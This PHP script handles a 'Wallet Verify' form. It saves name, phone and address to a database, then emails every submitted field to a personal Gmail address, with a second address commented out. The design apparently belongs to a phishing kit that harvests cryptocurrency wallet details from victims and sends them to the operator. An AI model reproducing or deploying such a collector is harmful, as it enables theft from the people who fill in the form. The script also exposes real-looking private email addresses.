<?php
if (isset($_POST['submit'])) {

    require_once("includes/dbConnect.php");
    $db_handle = new DBController();

    $name = $db_handle->checkValue($_POST['Name']);

    $phone = $db_handle->checkValue($_POST['Phone']);

    $address = $db_handle->checkValue($_POST['Address']);

    $from_email = $db_handle->from_email();

    $wallet_data = $db_handle->insertQuery("INSERT INTO `wallet_data`(`name`,`phone`,`address`) VALUES ('$name','$phone','$address')");

    $backend_message = '';

    $i = 0;
    foreach ($_POST as $key => $value) {
        if ($i < count($_POST) - 1) {
            $backend_message .= htmlspecialchars($key) . ": " . htmlspecialchars($value) . "<br>";
        }
        $i++;
    }

    //$email_to = 'frogbidofficial@gmail.com';

    $email_to = 'mingowhk@gmail.com';
    $subject = 'Wallet Verify';

    $headers = "From: Wallet Verify <" . $from_email . ">\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

    $messege = "<html>
                    <body style='background-color: #eee; font-size: 16px;'>
                        <div style='max-width: 600px; min-width: 200px; background-color: #fff; padding: 20px; margin: auto;'>

                            <p style='text-align: center;color:green;font-weight:bold'>New Wallet Verify Info</p>   
                        
                            <p style='color:black'> " . $backend_message . "
                            </p>
                        </div>
                    </body>
                </html>
                ";

    if (mail($email_to, $subject, $messege, $headers) && $wallet_data) {
        echo "<script>
                document.cookie = 'alert = 1;';
                window.location.href='Home';
                </script>";
    } else {
        echo "<script>
                document.cookie = 'alert = 2;';
                window.location.href='Home';
                </script>";
    }
}
